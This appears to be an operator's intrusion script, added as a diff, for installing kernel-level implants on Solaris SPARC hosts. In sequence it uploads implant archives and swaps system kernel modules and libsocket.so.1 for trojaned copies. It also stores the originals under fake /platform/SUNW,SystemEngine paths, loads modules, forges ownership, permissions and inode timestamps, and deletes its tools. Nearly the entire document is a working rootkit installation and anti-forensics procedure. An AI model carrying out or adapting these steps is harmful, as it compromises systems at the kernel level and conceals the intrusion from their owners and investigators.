@@ -1,0 +1,352 @@
+#NOGS
+
+# NOTE, THIS HASN'T BEEN FULLY TESTED!!
+-pause
+# NOTE, THIS HASN'T BEEN FULLY TESTED!!
+-pause
+
+# make sure filesystem types are "ufs"
+df -n /usr/kernel /usr /kernel/drv /kernel/exec /platform
+df -ak /usr/kernel /usr /kernel/drv /kernel/exec /platform
+egrep '(kernel|usr|platform)' /etc/mnttab
+mount -p | egrep '(kernel|usr|platform)'
+egrep '(kernel|usr|platform)' /etc/vfstab
+egrep '(kernel|usr|platform)' /etc/dfs/sharetab
+-pause
+
+-gs tripwire
+-pause
+
+uname -a
+psrinfo -v
+isainfo -kv
+-pause
+
+# itimehell begins
+-cmdout /current/down/itimehell
+
+# INC
+./it /kernel/exec
+./it /kernel/exec/intpexec
+./it /kernel/exec/sparcv9
+./it /kernel/exec/sparcv9/intpexec
+./it /usr/sbin
+./it /usr/sbin/sysidlib
+
+# PIPE
+./it /usr
+if [ -d /usr/vmsys ]; then ./it /usr/vmsys; ./it /usr/vmsys/bin; ./it /usr/vmsys/bin/vmodify; else ./it /usr/kernel; fi
+
+# RET
+./it /kernel/drv
+./it /kernel/drv/tl
+./it /kernel/drv/sparcv9
+./it /kernel/drv/sparcv9/tl
+
+# JL
+./it /usr/lib
+./it /usr/lib/libsocket.so.1
+./it /usr/lib/sparcv9
+./it /usr/lib/sparcv9/libsocket.so.1
+
+# OR
+./it /usr/kernel/fs
+./it /usr/kernel/fs/fdfs
+./it /usr/kernel/fs/sparcv9
+./it /usr/kernel/fs/sparcv9/fdfs
+./it /platform
+./it /platform/`uname -m`
+./it /usr/lib
+./it /usr/lib/sparcv9
+
+# The following lines   ; before picture
+-ls -i /usr/kernel/fs/fdfs /usr/kernel/fs/sparcv9/fdfs /kernel/drv/tl /kernel/drv/sparcv9/tl /kernel/exec/intpexec /kernel/exec/sparcv9/intpexec /usr/sbin/sysiddev /usr/vmsys/bin/pipe /usr/lib/libsocket.so.1 /usr/lib/sparcv9/libsocket.so.1
+-cmdout
+
+-lsh itflip /current/down/itimehell
+
+-pause
+# verify checksums of TARGET modules
+#
+# OS         file            size    sum
+# ------     -----           ----    --------
+# S7         fdfs             8560   21022 17
+#            sparcv9/fdfs    12784   42940 25
+# S8         fdfs             8832   49397 18
+#            sparcv9/fdfs    12864    8119 26
+
+sum /usr/kernel/fs/fdfs  /usr/kernel/fs/sparcv9/fdfs
+-pause
+
+# READY TO BEGIN?
+-pause
+
+mkdir /platform/SUNW,SystemEngine
+mkdir /platform/SUNW,SystemEngine/kernel
+mkdir /platform/SUNW,SystemEngine/kernel/drv
+mkdir /usr/lib/sparc
+-pause
+
+-put ../up/iu* iu.tar.Z
+
+uncompress iu.tar.Z && tar -xvf iu.tar && rm iu.tar
+-ls
+-pause
+
+cp /kernel/drv/tl tlm
+cp /kernel/drv/sparcv9/tl sparcv9/tlm
+cp /kernel/exec/intpexec int
+cp /kernel/exec/sparcv9/intpexec sparcv9/int
+-pause
+
+# verify checksums of TARGET modules
+#
+# OS       file              size    sum
+# ------   -----             ----    --------
+# S7       intpexec          3672    20696  8
+#          sparcv9/intpexec  5368    37576 11
+# S8       intpexec          3380    19739  7
+#          sparcv9/intpexec  4632    32047 10
+isainfo -kv
+
+# If in 64-bit mode
+#        mv sparcv9/it it
+#        mv sparcv9/bio bio
+-pause
+
+F=/usr/sbin/sysiddev; mv sy $F; chmod 711 $F;  chown root:sys $F
+-pause
+
+# it ###TIMES### /usr/sbin/sysiddev
+# it ###TIMES### /usr/sbin
+-pause
+-ls /usr/sbin/sys*
+-pause
+
+cp /usr/sbin/modload ml
+cp /usr/sbin/modinfo mi
+./ml bio; ./mi
+-pause
+
+date; date -u
+
+-ls -iR /kernel/exec
+
+-ls in sparcv9/in
+
+# 32 bit
+# mv /kernel/exec/intpexec /platform/SUNW,SystemEngine/kernel/drv/dma ; cp in /kernel/exec/intpexec
+
+# 64 bit
+# mv /kernel/exec/sparcv9/intpexec /platform/SUNW,SystemEngine/kernel/drv/leo ; cp sparcv9/in  /kernel/exec/sparcv9/intpexec
+-pause
+
+# if have 64 bit stuff  
+# it ###TIMES### /platform/SUNW,SystemEngine/kernel/drv/leo
+# it ###TIMES### /kernel/exec/sparcv9/intpexec
+# it ###TIMES### /kernel/exec/sparcv9
+# always do 32 bit stuff
+# it ###TIMES### /platform/SUNW,SystemEngine/kernel/drv/dma
+# it ###TIMES### /kernel/exec/intpexec
+# it ###TIMES### /kernel/exec
+-pause
+
+-ls -iR /kernel/exec
+rm -f bio in sparcv9/bio sparcv9/in
+-pause
+
+-ls -d /usr/vmsys
+# if /usr/vmsys does not exist
+# mkdir /usr/vmsys /usr/vmsys/bin
+# chmod -R 755 /usr/vmsys; chown -R bin:bin /usr/vmsys
+-pause
+
+F=/usr/vmsys/bin/pipe; mv pipe $F; chmod 755 $F; chown bin:bin $F
+-pause
+
+# it ###TIMES### /usr/vmsys/bin/pipe
+# it ###TIMES### /usr/vmsys/bin
+# it ###TIMES### /usr/vmsys
+
+# if /usr/vmsys did not exist
+# it ###TIMES### /usr
+-pause
+
+-ls /usr/vmsys/bin
+-pause
+ 
+# OS       file              size    sum
+# ------   -----             ----    --------
+# S7       tl               28956    23450
+#          sparcv9/tl       39424    12934
+# S8       tl               28532    53129
+#          sparcv9/tl       37400    51509
+
+-ls -l /kernel/drv/tl /kernel/drv/sparcv9/tl
+sum /kernel/drv/tl /kernel/drv/sparcv9/tl
+-pause
+
+isainfo -kv
+#(IF 64-bit mode)
+#        mv sparcv9/irt irt
+-pause
+
+./ml irt; ./mi
+-pause
+
+-rm irt sparcv9/irt
+-pause
+
+-ls trt sparcv9/trt
+-pause
+
+# 32 bit
+mv /kernel/drv/tl /platform/SUNW,SystemEngine/kernel/drv/fd; cp trt /kernel/drv/tl
+# 64 bit
+# mv /kernel/drv/sparcv9/tl /platform/SUNW,SystemEngine/kernel/drv/vme ; cp sparcv9/trt /kernel/drv/sparcv9/tl
+-pause
+
+# it ###TIMES### /platform/SUNW,SystemEngine/kernel/drv/vme
+# it ###TIMES### /kernel/drv/sparcv9/tl
+# it ###TIMES### /kernel/drv/sparcv9
+# it ###TIMES### /platform/SUNW,SystemEngine/kernel/drv/fd
+# it ###TIMES### /kernel/drv/tl
+# it ###TIMES### /kernel/drv
+-pause
+
+-rm sparcv9/trt trt
+-pause
+
+-ls -i /kernel/drv/tl /kernel/drv/sparcv9/tl /platform/SUNW,SystemEngine/kernel/drv/
+-pause
+
+
+# if Jack is already there....
+#     upload good binaries, and put them back; blowing out some inodes again
+#     You must also match the ownership and permissions
+
+  #upload uf.Z
+  3
+  uf.Z
+  ../up/uf.Z
+  uncompress uf.Z && tar -xvf uf && rm uf
+  # temporarily uninstall jack
+  ls -al lso /usr/lib/libsocket.so.1
+  chmod ### lso;chown ###:### lso;ls -al lso
+  ls -al sparcv9/lso /usr/lib/sparcv9/libsocket.so.1
+  chmod ### sparcv9/lso;chown ###:### sparcv9/lso;ls -al sparcv9/lso
+
+  mv lso /usr/lib/libsocket.so.1  
+  pf -m /usr/lib/libsocket.so.1
+  mv sparcv9/lso /usr/lib/sparcv9/libsocket.so.1
+  pf -m /usr/lib/sparcv9/libsocket.so.1
+
+
+# Start here if Jack not installed previously
+
+cp so /usr/lib/sparc/ld.so
+cp sparcv9/so /usr/lib/sparc/libC.so
+
+it ###TIMES### /usr/lib/sparc/libC.so
+it ###TIMES### /usr/lib/sparcv9/libsocket.so.1
+it ###TIMES### /usr/lib/sparcv9
+it ###TIMES### /usr/lib/sparc/ld.so
+it ###TIMES### /usr/lib/libsocket.so.1
+it ###TIMES### /usr/lib
+
+####################################################
+######## ORANGUTAN 
+####################################################
+mv /usr/kernel/fs/fdfs /usr/lib/sparc/lddstub;cp or /usr/kernel/fs/fdfs
+mv /usr/kernel/fs/sparcv9/fdfs /usr/lib/sparc/cpp;cp sparcv9/or /usr/kernel/fs/sparcv9/fdfs
+cp ka /platform/SUNW,SystemEngine/kadb
+-pause
+
+-rm tlm sparcv9/tlm int sparcv9/int lso sparcv9/lso so sparcv9/so or sparcv9/or ka
+
+chown root:sys /kernel/drv/tl /kernel/drv/sparcv9/tl
+chown root:sys /kernel/exec/intpexec /kernel/exec/sparcv9/intpexec
+chown root:sys /usr/sbin/sysiddev
+chown bin:bin /usr/vmsys/bin/pipe
+chown root:sys /usr/kernel/fs/fdfs /usr/kernel/fs/sparcv9/fdfs
+chown -R root:sys /platform/SUNW,SystemEngine /usr/lib/sparc
+chown root:bin /usr/lib/sparc
+chmod 755 /kernel/drv/tl /kernel/drv/sparcv9/tl
+chmod 755 /kernel/exec/intpexec /kernel/exec/sparcv9/intpexec
+chmod 711 /usr/sbin/sysiddev
+chmod 755 /usr/vmsys/bin/pipe
+chmod 755 /usr/kernel/fs/fdfs /usr/kernel/fs/sparcv9/fdfs
+chmod -R 755 /platform/SUNW,SystemEngine /usr/lib/sparc
+-pause
+
+# For IN
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kernel/drv/leo
+# ./it ## SAVED ITIME ## /kernel/exec/sparcv9/intpexec
+# ./it ## SAVED ITIME ## /kernel/exec/sparcv9
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kernel/drv/dma
+# ./it ## SAVED ITIME ## /kernel/exec/intpexec
+# ./it ## SAVED ITIME ## /kernel/exec
+# ./it ## SAVED ITIME ## /usr/sbin/sysiddev
+# ./it ## SAVED ITIME ## /usr/sbin
+# ./it ## SAVED ITIME ## /usr/vmsys/bin/pipe
+# ./it ## SAVED ITIME ## /usr/vmsys/bin
+# ./it ## SAVED ITIME ## /usr/vmsys
+# ./it ## SAVED ITIME ## /usr
+-pause
+
+
+# For RE
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kernel/drv/vme
+# ./it ## SAVED ITIME ## /kernel/drv/sparcv9/tl
+# ./it ## SAVED ITIME ## /kernel/drv/sparcv9
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kernel/drv/fd
+# ./it ## SAVED ITIME ## /kernel/drv/tl
+# ./it ## SAVED ITIME ## /kernel/drv
+-pause
+
+# For OR
+# ./it ## SAVED ITIME ## /usr/lib/sparc/cpp
+# ./it ## SAVED ITIME ## /usr/kernel/fs/sparcv9/fdfs
+# ./it ## SAVED ITIME ## /usr/kernel/fs/sparcv9
+# ./it ## SAVED ITIME ## /usr/lib/sparc/lddstub
+# ./it ## SAVED ITIME ## /usr/kernel/fs/fdfs
+# ./it ## SAVED ITIME ## /usr/kernel/fs
+-pause
+
+# For JL
+# ./it ## SAVED ITIME ## /usr/lib/sparc/libC.so
+# ./it ## SAVED ITIME ## /usr/lib/sparc/ld.so
+-pause
+
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kernel/drv
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kernel
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine/kadb
+# ./it ## SAVED ITIME ## /platform/SUNW,SystemEngine
+# ./it ## SAVED ITIME ## /platform
+-pause
+
+# ./it ## SAVED ITIME  ## /usr/lib/sparc
+# ./it ## SAVED ITIME  ## /usr/lib
+-pause
+
+ls -il /kernel/drv/tl /kernel/drv/sparcv9/tl
+ls -il /kernel/exec/intpexec /kernel/exec/sparcv9/intpexec /usr/sbin/sysiddev
+ls -il /usr/vmsys/bin/pipe
+ls -il /usr/lib/libsocket.so.1 /usr/lib/sparcv9/libsocket.so.1
+ls -il /usr/kernel/fs/fdfs /usr/kernel/fs/sparcv9/fdfs
+ls -il /platform/SUNW,SystemEngine/kernel/drv /usr/lib/sparc
+-pause
+
+isainfo -kv
+#### IF 32-bit
+#       ./ml ./om
+#### ELSE 64-bit
+#       ./ml ./sparcv9/om
+-pause
+
+./mi
+
+-ls -i /platform/SUNW,SystemEngine /usr/lib/sparc /usr/kernel/fs/fdfs /usr/kernel/fs/sparcv9/fdfs /kernel/drv/tl /kernel/drv/sparcv9/tl /kernel/exec/intpexec /kernel/exec/sparcv9/intpexec /usr/sbin/sysiddev /usr/lib/libsocket.so.1 /usr/lib/sparcv9/libsocket.so.1 /usr/vmsys/bin/pipe
+
+rm -rf pf it sparcv9 om ml mi
+
